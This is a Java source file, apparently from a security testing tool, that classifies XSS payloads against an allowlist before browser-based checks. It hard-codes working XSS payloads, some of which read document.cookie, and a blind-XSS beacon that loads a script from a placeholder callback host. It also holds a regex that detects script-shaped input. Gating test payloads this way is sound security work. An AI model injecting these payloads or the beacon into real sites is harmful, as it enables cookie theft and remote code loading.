package com.victor.reconloop;

import java.util.Set;
import java.util.regex.Pattern;

/** Reviewed browser recipes, not an attempt to prove arbitrary JavaScript safe with a URL regex. */
final class CorpusBrowserPolicy {
    static final String HOST_MARKER = "{{RECON_OAST_HOST}}";
    static final String BEACON = "\"><script src=//" + HOST_MARKER + "/rh.js></script>";
    enum Kind {
        ORDINARY, LOCAL_MARKER, CONTROLLED_BEACON, QUARANTINED;
        boolean allowed() { return this != QUARANTINED; }
        boolean browser() { return this == LOCAL_MARKER || this == CONTROLLED_BEACON; }
        boolean callback() { return this == CONTROLLED_BEACON; }
    }
    // Exact reviewed source strings. Encoding is applied only after this classification.
    private static final Set<String> LOCAL_MARKERS = Set.of(
            "<script>alert(1)</script>", "<svg onload=alert(1)>", "\"><svg onload=alert(1)>",
            "\">'><details/open/ontoggle=confirm('XSS')>",
            "</script><script>prompt(document.domain)</script>",
            "<svg onload=confirm(document.domain)>", "sdf<script>alert(12)</script>",
            "javascript:prompt(document.cookie);//", "javascript:alert(document.cookie)//",
            "<script>alert(document.cookies)</script>", "<svg onload=\"alert(document.cookies)\">",
            "\"'<svg/onload=prompt(document.cookie);>");
    // Browser-shaped entries in another category do not inherit that category's weaker permissions.
    // Unknown xss entries are quarantined regardless of this heuristic's result.
    private static final Pattern BROWSER_SHAPE = Pattern.compile(
            "(?i)<\\s*/?\\s*(?:script|svg|img|iframe|object|embed|link|meta|base)\\b|javascript\\s*:|"
                    + "\\bon[a-z]+\\s*=|\\b(?:document\\s*\\.\\s*(?:write|createElement)\\b|window\\s*\\.\\s*location\\b|fetch\\s*\\(|XMLHttpRequest\\b)");
    private static final Pattern CALLBACK_HOST = Pattern.compile(
            "(?=.{1,253}$)[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?(?:\\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)+");

    static Kind classify(String category, String raw) {
        String source = raw == null ? "" : raw.strip();
        if ("xss".equals(category)) {
            if (source.equals(BEACON)) return Kind.CONTROLLED_BEACON;
            if (LOCAL_MARKERS.contains(source)) return Kind.LOCAL_MARKER;
            return Kind.QUARANTINED;
        }
        if (source.contains(HOST_MARKER) || BROWSER_SHAPE.matcher(source).find()) return Kind.QUARANTINED;
        return Kind.ORDINARY;
    }

    static String bind(String raw, String callbackHost) {
        if (!raw.strip().equals(BEACON)) return raw;
        if (callbackHost == null || !CALLBACK_HOST.matcher(callbackHost).matches()
                || DestinationAddress.inspect(callbackHost).kind() != DestinationAddress.Kind.NAME)
            throw new IllegalArgumentException("invalid Collaborator browser callback host");
        return raw.replace(HOST_MARKER, callbackHost);
    }
}
